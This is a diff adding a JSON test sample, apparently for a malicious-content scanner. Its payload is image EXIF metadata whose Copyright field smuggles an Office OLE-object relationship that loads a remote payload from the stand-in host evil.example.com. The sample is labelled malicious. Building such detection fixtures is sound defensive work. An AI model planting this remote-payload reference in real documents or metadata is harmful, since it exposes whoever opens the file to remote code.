@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::78::binary-variations::5",
+  "base_sample_id": "exp::document-office::78",
+  "generator_id": "binary-variations",
+  "generator_version": "1.0.0",
+  "seed": 61992122,
+  "content": "{\n  \"format\": \"image\",\n  \"metadata\": {\n    \"Copyright\": \"<Relationship Type=\\\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\\\" Target=\\\"mhtml:http://evil.example.com/payload!x.html\\\"/>\\n\",\n    \"Make\": \"Canon\",\n    \"Model\": \"EOS R5\",\n    \"DateTime\": \"2026:01:15 10:30:00\",\n    \"ExifVersion\": \"0232\"\n  }\n}",
+  "content_hash": "cbc84e9e39d3e5601bc6a3850ac5a5cdc2ec7712b5c22546211583b2eb3e3c76",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "binary:exif",
+  "difficulty": "advanced"
+}
